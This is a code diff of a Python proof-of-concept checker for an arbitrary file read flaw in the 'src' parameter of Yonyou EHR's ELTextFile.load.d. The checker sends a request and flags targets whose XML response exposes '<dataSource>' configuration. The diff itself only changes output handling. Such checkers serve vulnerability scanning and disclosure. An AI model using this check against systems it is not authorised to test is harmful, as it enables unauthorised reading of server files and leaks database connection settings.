@@ -8,8 +8,8 @@ description: 文件/hrss/ELTextFile.load.d中,参数src存在任意文件读取�
 '''
 import sys
 import requests
-import warnings
-from termcolor import cprint
+
+
 
 class yonyou_ehr_ELTextFile_BaseVerify:
     def __init__(self, url):
@@ -24,12 +24,12 @@ class yonyou_ehr_ELTextFile_BaseVerify:
         try:
             req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
             if req.headers["Content-Type"] == "application/xml" and r"<dataSource>" in req.text:
-                cprint("[+]存在用友EHR 任意文件读取漏洞...(高危)\tpayload: "+vulnurl, "red")
+                return "[+]存在用友EHR 任意文件读取漏洞...(高危)\tpayload: "+vulnurl
 
         except:
-            cprint("[-] "+__file__+"====>连接超时", "cyan")
+            return "[-]connect timeout"
 
 if __name__ == "__main__":
-    warnings.filterwarnings("ignore")
+
     testVuln = yonyou_ehr_ELTextFile_BaseVerify(sys.argv[1])
     testVuln.run()
